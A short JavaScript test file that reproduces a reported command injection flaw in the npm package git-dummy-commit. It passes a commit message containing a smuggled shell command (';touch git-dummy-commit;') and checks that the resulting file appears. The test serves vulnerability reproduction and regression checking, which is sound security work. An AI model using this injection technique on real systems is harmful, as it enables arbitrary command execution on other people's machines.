//https://hackerone.com/reports/341710
test("Command Injection in git-dummy-commit", () => 
{
	const gitDummyCommit = require('git-dummy-commit');
	const fs = require('fs');
	const path = './git-dummy-commit';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	gitDummyCommit('";touch git-dummy-commit;"');
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
